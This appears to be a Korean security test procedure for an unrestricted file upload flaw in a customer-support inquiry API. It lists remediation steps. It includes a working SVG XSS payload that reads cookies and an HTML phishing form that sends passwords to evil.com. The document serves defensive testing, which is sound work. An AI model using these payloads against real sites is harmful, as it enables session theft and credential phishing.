================================================================================
[VCE-SUPPORT-02] 고객 문의 파일 첨부 검증 없음 → 악성 파일 업로드
도메인: support (고객센터)
================================================================================

## 1. 진단 항목 개요

- **항목명**: 문의 첨부파일 확장자/MIME 검증 없음
- **번호**: SUPPORT-02
- **위험도**: Critical
- **OWASP**: A03:2021 – Injection / Unrestricted File Upload

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/support/inquiries |
| 운영 | https://vceapp.com/api/support/inquiries |
| HTTP 메서드 | POST (multipart/form-data) |
| 인증 요건 | Bearer JWT 필요 |

## 3. 취약점 원리 (Why this works)

`FileService.java:42`에 공통으로 사용되는 파일 저장 로직에 확장자 검증이 없다.
고객 문의 첨부파일도 동일한 FileService를 사용하면 동일한 취약점이 적용된다.

## 4. 테스트 절차 (Step-by-step)

### Step 1. 정상 문의 파일 첨부 확인

```
POST /api/support/inquiries HTTP/1.1
Host: localhost:8080
Authorization: Bearer <JWT>
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="data"
Content-Type: application/json

{"title": "테스트 문의", "content": "문의 내용입니다", "category": "GENERAL"}
------Boundary
Content-Disposition: form-data; name="file"; filename="screenshot.png"
Content-Type: image/png

[PNG 바이너리]
------Boundary--
```

---

### Step 2. SVG XSS 파일 업로드

```
------Boundary
Content-Disposition: form-data; name="file"; filename="evil.svg"
Content-Type: image/svg+xml

<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
<circle cx="50" cy="50" r="50"/>
</svg>
------Boundary--
```

관리자가 문의를 확인할 때 XSS 발동 가능.

---

### Step 3. HTML 파일 업로드

```
------Boundary
Content-Disposition: form-data; name="file"; filename="phishing.html"
Content-Type: text/html

<html><body>
<form action="https://evil.com" method="POST">
비밀번호: <input type="password" name="pw">
<button>확인</button>
</form>
</body></html>
------Boundary--
```

---

### Step 4. 업로드된 파일 URL 직접 접근

```
GET /uploads/uuid_evil.svg HTTP/1.1
Host: localhost:8080
```

(인증 없이 접근 가능 여부 확인 — SecurityConfig.java:72 취약점과 연계)

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- SVG/HTML 업로드 성공 (HTTP 200)
- 업로드된 URL 접근 시 브라우저에서 스크립트 실행

✗ **안전 (Not Vulnerable)**:
- 이미지 파일(JPG, PNG, PDF)만 업로드 허용
- SVG/HTML 업로드 시 HTTP 400

## 6. 예상 취약 포인트 (코드 위치)

- `FileService.java:42` — 확장자 검증 없는 공통 파일 저장 메서드
- `SupportController.java` — 문의 처리 시 FileService 사용

## 7. 권고 조치

- 허용 확장자 화이트리스트: `.jpg`, `.jpeg`, `.png`, `.pdf`, `.txt`
- SVG 파일 업로드 명시적 차단
- 관리자 문의 확인 페이지에서 첨부파일을 다운로드로만 제공 (브라우저 렌더링 방지)
